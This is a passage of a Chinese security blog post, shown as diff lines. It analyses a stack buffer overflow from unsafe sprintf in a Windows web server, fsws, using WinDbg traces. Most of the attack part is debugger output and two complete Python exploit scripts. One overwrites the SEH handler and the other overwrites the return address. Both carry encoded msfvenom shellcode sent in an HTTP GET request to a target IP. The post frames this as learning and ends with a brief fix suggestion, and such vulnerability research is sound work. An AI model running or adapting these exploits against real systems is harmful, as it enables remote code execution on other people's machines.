+<p>可以发现函数调用<code>_sprintf</code>函数，它是一个危险的函数，如果不控制好传入字符串的长度就会造成溢出，而且下面有调用了我们要回溯的函数，所以这里很可能就是造成漏洞的位置。另一处和这里一样都调用了<code>_sprintf</code>，那么可以在这两处的<code>_sprnitf</code>处下断点看看究竟哪一处能有机会造成漏洞。在分析前同样得找到离漏洞触发最近的一次断点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=02f549a8 ebx=00001101 ecx=02f549f8 edx=03125fa4 esi=03127028 edi=048cf494</span><br><span class="line">eip=0049747e esp=03125f6c ebp=031275f4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">fsws+0x9747e:</span><br><span class="line">0049747e e8f71b0600      call    fsws+0xf907a (004f907a)</span><br><span class="line"></span><br><span class="line">0:007&gt; dd esp</span><br><span class="line">03125f6c  03125fa4 005a180c 02f549f8 02f549a8</span><br><span class="line">03125f7c  048cf494 ffffffff 031271f8 00001107</span><br><span class="line">03125f8c  02f549f8 02f549a8 00000000 00000000</span><br><span class="line">03125f9c  00000000 02f56000 656c6573 2a207463</span><br><span class="line">03125fac  6f726620 7173206d 6261746c 6c20656c</span><br><span class="line">03125fbc  74696d69 00003120 00000000 00000000</span><br><span class="line">03125fcc  00000000 00000000 00000000 00000000</span><br><span class="line">03125fdc  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:007&gt; dc 005a180c </span><br><span class="line">005a180c  656c6573 2a207463 6f726620 7325206d  select * from %s</span><br><span class="line">005a181c  65687720 25206572 25273d73 00002773   where %s=&apos;%s&apos;..</span><br><span class="line">005a182c  65687720 25206572 25273d73 00002773   where %s=&apos;%s&apos;..</span><br><span class="line">005a183c  656c6573 2a207463 6f726620 7325206d  select * from %s</span><br><span class="line">005a184c  6d696c20 31207469 00000000 656c6573   limit 1....sele</span><br><span class="line">005a185c  2a207463 6f726620 7325206d 65687720  ct * from %s whe</span><br><span class="line">005a186c  25206572 273d3c73 20277325 6564726f  re %s&lt;=&apos;%s&apos; orde</span><br><span class="line">005a187c  79622072 73252720 45442027 00004353  r by &apos;%s&apos; DESC..</span><br><span class="line"></span><br><span class="line">0:007&gt; dc 048cf494 </span><br><span class="line">048cf494  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">048cf4a4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">048cf4b4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">048cf4c4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">048cf4d4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">048cf4e4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">048cf4f4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">048cf504  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure></p>
+<p>找到离漏洞触发最近的断点后查看了函数的参数，<code>_sprintf</code>会把字符串写入<code>03125f6c</code>处这在栈上。通过格式字符串可以找到第三个<code>%s</code>，而且这里面存放的就是畸形字符串。然后单步步过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; </span><br><span class="line">eax=000011b8 ebx=00001101 ecx=03125f44 edx=0312715b esi=03127028 edi=048cf494</span><br><span class="line">eip=00497483 esp=03125f6c ebp=031275f4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">fsws+0x97483:</span><br><span class="line">00497483 83c414          add     esp,14h</span><br><span class="line">0:007&gt; dc 03125fa4 </span><br><span class="line">03125fa4  656c6573 2a207463 6f726620 7173206d  select * from sq</span><br><span class="line">03125fb4  6261746c 7720656c 65726568 6d616e20  ltable where nam</span><br><span class="line">03125fc4  41273d65 41414141 41414141 41414141  e=&apos;AAAAAAAAAAAAA</span><br><span class="line">03125fd4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">03125fe4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">03125ff4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">03126004  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">03126014  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure></p>
+<p>可以看到字符串已经完全拷贝到栈空间。然后继续单步步过直到<code>sub_496600</code>函数的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; </span><br><span class="line">eax=03125fa4 ebx=00001101 ecx=03127028 edx=0312715b esi=03127028 edi=048cf494</span><br><span class="line">eip=00497492 esp=03125f78 ebp=031275f4 iopl=0         nv up ei pl nz ac po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212</span><br><span class="line">fsws+0x97492:</span><br><span class="line">00497492 e869f1ffff      call    fsws+0x96600 (00496600)</span><br></pre></td></tr></table></figure></p>
+<p>这里关注一下之后调用<code>sub_496600</code>函数的代码，可以看到传入该函数的第一个参数是ecx，而且ecx在<code>03125fa4</code>栈地址的下方，所以如果畸形字符串足够长那么就会覆盖ecx指向的内存，根据前面的分析，ecx指向的内存最后就会赋给eax然后造成内存访问异常。可以计算一下<code>ecx-0x03125fa4-len(&quot;select * from sqltable where name=&#39;&quot;)=4193</code>,就是说畸形字符串长度超过4193字节后就可能会触发内存访问异常。</p>
+<hr>
+<h2 id="漏洞利用（一）"><a href="#漏洞利用（一）" class="headerlink" title="漏洞利用（一）"></a>漏洞利用（一）</h2><p>在造成内存访问异常后，会触发seh异常处理，这里我直接覆盖异常处理句柄进而执行shellcode，暂时不考虑绕过各种安全机制。<br>编写exp前首先计算如何布局shellcode内存，其实可以利用pwntools中的cyclic工具生成payload进行填写然后可以快速的确定布局，但是这里直接手动计算全是为了学习。</p>
+<p>重新调试程序不附加断点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; !teb</span><br><span class="line">TEB at 0031e000</span><br><span class="line">    ExceptionList:        03226fa4</span><br><span class="line">    StackBase:            03240000</span><br><span class="line">    StackLimit:           03224000</span><br><span class="line">    SubSystemTib:         00000000</span><br><span class="line">    FiberData:            00001e00</span><br><span class="line">    ArbitraryUserPointer: 00000000</span><br><span class="line">    Self:                 0031e000</span><br><span class="line">    EnvironmentPointer:   00000000</span><br><span class="line">    ClientId:             00008af0 . 00002348</span><br><span class="line">    RpcHandle:            00000000</span><br><span class="line">    Tls Storage:          0080bc28</span><br><span class="line">    PEB Address:          00306000</span><br><span class="line">    LastErrorValue:       2</span><br><span class="line">    LastStatusValue:      c0000034</span><br><span class="line">    Count Owned Locks:    0</span><br><span class="line">    HardErrorMode:        0</span><br><span class="line">0:007&gt; dps 03226fa4 l2</span><br><span class="line">03226fa4  41414141</span><br><span class="line">03226fa8  41414141		；seh处理句柄</span><br><span class="line"></span><br><span class="line">0:007&gt; dc edi</span><br><span class="line">03225fa4  656c6573 2a207463 6f726620 7173206d  select * from sq</span><br><span class="line">03225fb4  6261746c 7720656c 65726568 6d616e20  ltable where nam</span><br><span class="line">03225fc4  41273d65 41414141 41414141 41414141  e=&apos;AAAAAAAAAAAAA</span><br><span class="line">03225fd4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">03225fe4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">03225ff4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">03226004  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">03226014  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure></p>
+<p>这里虽然被覆盖成畸形字符串，但是第一个seh处理句柄地址不变，另外edi的值就是sql查询字符串的地址（汇编可以分析出来），虽然栈地址每次执行程序都会改变但是相对距离不变，所以这里计算<code>异常处理句柄地址和payload首部的距离=0x03226fa8-0x03225fa4-len(&quot;select * from sqltable where name=&#39;&quot;)=4065</code>。然后覆盖异常处理句柄，可以直接在<code>ImageLoad.dll</code>的内存空间中搜索<code>pop pop ret</code>的跳转指令，这个dll也是主程序要加载的dll，而且它的内存空间的地址没有0字节。这样使程序跳转到shellcode的范围内，这里可以使用相关工具搜索。在异常处理时栈的情况是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd esp</span><br><span class="line">032255a0  77906202 03225a48 03226fa4 03225a98</span><br><span class="line">032255b0  03225610 03226fa4 77906220 03226fa4</span><br><span class="line">032255c0  03225a20 779061d4 03225a48 03226fa4</span><br><span class="line">032255d0  03225a98 03225610 41414141 03225a98</span><br><span class="line">032255e0  03225a48 03225a30 778e3065 03225a48</span><br><span class="line">032255f0  03226fa4 03225a98 03225610 41414141</span><br><span class="line">03225600  03225fa4 03225f7c 032256dc 778f9fd0</span><br><span class="line">03225610  61866a22 00000000 03224000 03240000</span><br></pre></td></tr></table></figure></p>
+<p>那么执行完<code>ret</code>后<code>03226fa4</code>将作为返回地址赋给eip，这里需要计算<code>03226fa4</code>在payload中的位置以便布置shellcode,<code>03226fa4与payload首部距离=0x03226fa4-0x03225fa4-len(&quot;select * from sqltable where name=&#39;&quot;)=4061</code>，在payload偏移4061处可以填充一个4字节的向前跳转或向后跳转指令，但注意其后的异常处理句柄的位置。这里使用的shellcode是用<code>msfvenom</code>生成的打开一个计算器的shellcode<code>msfvenom -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -i 2 -f python -b &#39;\x00\x0a\x0d\x20\x5c\x2c\x25\x2f&#39;</code>,需要注意的是应该尽量避免特殊字符对payload的影响。于是编写如下exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># fileName: exp.py</span></span><br><span class="line"><span class="comment"># usage: python exp.py ip</span></span><br><span class="line"><span class="comment"># shellcode by 'msfvenom' use: msfvenom -p windows/exec CMD=calc.exe -e</span></span><br><span class="line"><span class="comment">#                                x86/shikata_ga_nai -i 2 -f python -b '\x00\x0a\x0d\x20\x5c\x2c\x25\x2f'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xbe\xa6\x51\x73\xac\xdb\xcc\xd9\x74\x24\xf4\x5a\x29"</span></span><br><span class="line">buf += <span class="string">"\xc9\xb1\x38\x83\xc2\x04\x31\x72\x0e\x03\xd4\x5f\x91"</span></span><br><span class="line">buf += <span class="string">"\x59\xa6\xfb\x5a\x4e\x3f\x21\xae\x57\xcb\xf2\xdb\x30"</span></span><br><span class="line">buf += <span class="string">"\x18\x32\x92\xf0\x6f\xb4\xc6\xf1\xff\x27\x6a\x35\x60"</span></span><br><span class="line">buf += <span class="string">"\xaa\x75\xa3\xe9\x46\x67\x2d\x92\xbd\x0c\xb1\x2a\xa9"</span></span><br><span class="line">buf += <span class="string">"\xdd\xf2\xba\x76\xba\xf9\x3e\x39\x34\xbc\xa1\xe7\xc0"</span></span><br><span class="line">buf += <span class="string">"\x71\xf5\x6f\x3c\x8d\xac\xd1\x7c\xf1\x87\xa9\x6a\x4e"</span></span><br><span class="line">buf += <span class="string">"\xc7\xba\xfc\xcf\xb2\x52\x7c\x1c\x32\x4f\x4a\x67\x71"</span></span><br><span class="line">buf += <span class="string">"\x3f\x37\x08\xf2\x6b\xb5\x5b\x33\xc4\x79\x61\x8f\xe5"</span></span><br><span class="line">buf += <span class="string">"\x9f\xc2\x86\xc0\x88\xb4\x56\x33\x56\xfd\x42\xcf\x68"</span></span><br><span class="line">buf += <span class="string">"\x61\xff\xd3\xd6\x40\x45\x24\x48\x5a\xc5\xcb\x5e\xfd"</span></span><br><span class="line">buf += <span class="string">"\x4a\xa1\xb1\xa6\xb6\xf0\x37\x98\x12\x18\x14\x7d\x0f"</span></span><br><span class="line">buf += <span class="string">"\xd3\x1f\xea\xf6\x50\x97\xdc\x75\x9d\x34\x6f\xfc\x56"</span></span><br><span class="line">buf += <span class="string">"\xe7\xec\xf6\x1b\x6f\xf5\x57\x4b\xd9\xe4\x68\x45\xcf"</span></span><br><span class="line">buf += <span class="string">"\x58\x76\x4e\x9d\x53\x7a\x62\x6c\x34\xd8\x86\xed\x5a"</span></span><br><span class="line">buf += <span class="string">"\xf4\x82\x93\x53\x18\xe6\x04\xe8\xd3\x12\x6a\xa1\xa3"</span></span><br><span class="line">buf += <span class="string">"\xe6\xf0\x4e\x53\x65\x24\xd0\xf2\xa5\xfd\x4d\x11\xa4"</span></span><br><span class="line">buf += <span class="string">"\xa8\x1b\x4c\x3e\x13\xc3\xfe\x17\x5b\x08\x16\x50\xfe"</span></span><br><span class="line">buf += <span class="string">"\x1c\xb9\xb8\xee\x74\x7b\x3c\x82\x0c\x26\x39\x72\x77"</span></span><br><span class="line"><span class="comment">#247 bytes</span></span><br><span class="line">RHOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">RPORT = <span class="number">80</span></span><br><span class="line">payload = <span class="string">'\x90'</span>*<span class="number">4061</span> <span class="comment">#junk code</span></span><br><span class="line">payload += <span class="string">'\xeb\x06\x90\x90'</span> <span class="comment">#jmp higher addr;offset = 8-2 = 6 = 0x06</span></span><br><span class="line">payload += <span class="string">'\x5f\xab\x01\x10'</span> <span class="comment">#'pop pop return' addr 0x1001ab5f</span></span><br><span class="line">payload += buf <span class="comment">#shellcode</span></span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">s.connect((RHOST,RPORT))</span><br><span class="line">s.send(<span class="string">'GET '</span>+payload+<span class="string">' HTTP/1.0\r\n\r\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'done.'</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="漏洞利用（二）"><a href="#漏洞利用（二）" class="headerlink" title="漏洞利用（二）"></a>漏洞利用（二）</h2><p>利用（一）中的分析，如果传入的payload长度为<code>4193</code>这时payload无法覆盖到eax那么就不会引起内存访问异常，但是实际上它会引起返回地址被覆盖，从而我们可以利用覆盖返回地址来利用漏洞。下面要确定返回地址在何处被覆盖，这里在前面分析的能造成漏洞的<code>_sprintf</code>处下断点并找到离漏洞触发最近的一次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=030849a8 ebx=00001001 ecx=030849f8 edx=03185fa4 esi=03187028 edi=02ebe1c4</span><br><span class="line">eip=0049747e esp=03185f6c ebp=031875f4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">fsws+0x9747e:</span><br><span class="line">0049747e e8f71b0600      call    fsws+0xf907a (004f907a)</span><br><span class="line">0:009&gt; dd esp</span><br><span class="line">03185f6c  03185fa4 005a180c 030849f8 030849a8</span><br><span class="line">03185f7c  02ebe1c4 ffffffff 031871f8 00001007</span><br><span class="line">03185f8c  030849f8 030849a8 00000000 00000000</span><br><span class="line">03185f9c  00000000 03086000 656c6573 2a207463</span><br><span class="line">03185fac  6f726620 7173206d 6261746c 6c20656c</span><br><span class="line">03185fbc  74696d69 00003120 00000000 00000000</span><br><span class="line">03185fcc  00000000 00000000 00000000 00000000</span><br><span class="line">03185fdc  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure></p>
+<p>然后一直单步步过直到遇到<code>ret</code>指令或者触发漏洞时停下，实际上它在执行<code>ret</code>之前并不会触发漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0:009&gt; </span><br><span class="line">eax=00000000 ebx=00001007 ecx=41414141 edx=00250000 esi=031871f8 edi=ffffffff</span><br><span class="line">eip=00497562 esp=03186fb0 ebp=031875f4 iopl=0         nv up ei pl nz ac po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212</span><br><span class="line">fsws+0x97562:</span><br><span class="line">00497562 c20c00          ret     0Ch</span><br><span class="line">0:009&gt; dd esp</span><br><span class="line">03186fb0  41414141 41414141 41414141 41414141</span><br><span class="line">03186fc0  41414141 41414141 41414141 41414141</span><br><span class="line">03186fd0  41414141 41414141 41414141 41414141</span><br><span class="line">03186fe0  41414141 41414141 41414141 41414141</span><br><span class="line">03186ff0  41414141 41414141 41414141 41414141</span><br><span class="line">03187000  41414141 41414141 41414141 41414141</span><br><span class="line">03187010  41414141 41414141 41414141 41414141</span><br><span class="line">03187020  41414141 41414141 05130027 00000000</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，函数返回时返回地址已经被畸形字符串覆盖，而且可以计算出<code>retAddr与payload首部距离=0x03186fb0-0x03185fa4-len(&quot;select * from sqltable where name=&#39;&quot;)=4073</code>，于是又可以写出利用返回地址覆盖的exp，这里的shellcode仍然是（一）的shellcode<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># fileName: exp2.py</span></span><br><span class="line"><span class="comment"># usage: python exp2.py ip</span></span><br><span class="line"><span class="comment"># shellcode by 'msfvenom' use: msfvenom -p windows/exec CMD=calc.exe -e</span></span><br><span class="line"><span class="comment">#                                x86/shikata_ga_nai -i 2 -f python -b '\x00\x0a\x0d\x20\x5c\x2c\x25\x2f'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"\xbe\xa6\x51\x73\xac\xdb\xcc\xd9\x74\x24\xf4\x5a\x29"</span></span><br><span class="line">buf += <span class="string">"\xc9\xb1\x38\x83\xc2\x04\x31\x72\x0e\x03\xd4\x5f\x91"</span></span><br><span class="line">buf += <span class="string">"\x59\xa6\xfb\x5a\x4e\x3f\x21\xae\x57\xcb\xf2\xdb\x30"</span></span><br><span class="line">buf += <span class="string">"\x18\x32\x92\xf0\x6f\xb4\xc6\xf1\xff\x27\x6a\x35\x60"</span></span><br><span class="line">buf += <span class="string">"\xaa\x75\xa3\xe9\x46\x67\x2d\x92\xbd\x0c\xb1\x2a\xa9"</span></span><br><span class="line">buf += <span class="string">"\xdd\xf2\xba\x76\xba\xf9\x3e\x39\x34\xbc\xa1\xe7\xc0"</span></span><br><span class="line">buf += <span class="string">"\x71\xf5\x6f\x3c\x8d\xac\xd1\x7c\xf1\x87\xa9\x6a\x4e"</span></span><br><span class="line">buf += <span class="string">"\xc7\xba\xfc\xcf\xb2\x52\x7c\x1c\x32\x4f\x4a\x67\x71"</span></span><br><span class="line">buf += <span class="string">"\x3f\x37\x08\xf2\x6b\xb5\x5b\x33\xc4\x79\x61\x8f\xe5"</span></span><br><span class="line">buf += <span class="string">"\x9f\xc2\x86\xc0\x88\xb4\x56\x33\x56\xfd\x42\xcf\x68"</span></span><br><span class="line">buf += <span class="string">"\x61\xff\xd3\xd6\x40\x45\x24\x48\x5a\xc5\xcb\x5e\xfd"</span></span><br><span class="line">buf += <span class="string">"\x4a\xa1\xb1\xa6\xb6\xf0\x37\x98\x12\x18\x14\x7d\x0f"</span></span><br><span class="line">buf += <span class="string">"\xd3\x1f\xea\xf6\x50\x97\xdc\x75\x9d\x34\x6f\xfc\x56"</span></span><br><span class="line">buf += <span class="string">"\xe7\xec\xf6\x1b\x6f\xf5\x57\x4b\xd9\xe4\x68\x45\xcf"</span></span><br><span class="line">buf += <span class="string">"\x58\x76\x4e\x9d\x53\x7a\x62\x6c\x34\xd8\x86\xed\x5a"</span></span><br><span class="line">buf += <span class="string">"\xf4\x82\x93\x53\x18\xe6\x04\xe8\xd3\x12\x6a\xa1\xa3"</span></span><br><span class="line">buf += <span class="string">"\xe6\xf0\x4e\x53\x65\x24\xd0\xf2\xa5\xfd\x4d\x11\xa4"</span></span><br><span class="line">buf += <span class="string">"\xa8\x1b\x4c\x3e\x13\xc3\xfe\x17\x5b\x08\x16\x50\xfe"</span></span><br><span class="line">buf += <span class="string">"\x1c\xb9\xb8\xee\x74\x7b\x3c\x82\x0c\x26\x39\x72\x77"</span></span><br><span class="line"><span class="comment">#247 bytes</span></span><br><span class="line">RHOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">RPORT = <span class="number">80</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'\x90'</span>*(<span class="number">4073</span>-len(buf)) <span class="comment">#junk code</span></span><br><span class="line">payload += buf <span class="comment">#shellcode</span></span><br><span class="line">payload += <span class="string">'\x09\x21\x76\x76'</span> <span class="comment">#0x76762109,'jmp esp' is from 'user32.dll'</span></span><br><span class="line">payload += <span class="string">'\x90'</span>*<span class="number">12</span> <span class="comment">#junk code</span></span><br><span class="line">payload += <span class="string">'\xe9\xec\xfe\xff\xff'</span> <span class="comment">#jump higher addr = shellcode;offset = -(8+len(buf)+4+12+5) = -276 = 0xfffffeec</span></span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">s.connect((RHOST,RPORT))</span><br><span class="line">s.send(<span class="string">'GET '</span>+payload+<span class="string">' HTTP/1.0\r\n\r\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'done.'</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>应当使用安全的函数进行字符串拼接。</p>
+<hr>
+<h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p>这种栈溢出的漏洞往往是因为错误的或不安全的使用函数造成的，这个程序正是由于未安全的使用<code>sprintf</code>函数造成的溢出。关于漏洞利用方面，我这里使用了攻击seh和覆盖返回地址的方式，但是并没有对windows下的安全机制进行明确的绕过说明，主要是因为还在初步学习漏洞利用的技巧，而且在不同的系统环境下exp是否有效并不能保证。</p>
+<hr>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<p>k0shl大佬的视频<a href="https://www.ichunqiu.com/qad/course/56127" target="_blank" rel="noopener">https://www.ichunqiu.com/qad/course/56127</a></p>
+</blockquote>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/05/PCManFTP2.0 (CVE-2013-4730)漏洞分析/" rel="prev" title="PCManFTP2.0 (CVE-2013-4730)漏洞分析">
+                PCManFTP2.0 (CVE-2013-4730)漏洞分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">r00tnb</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
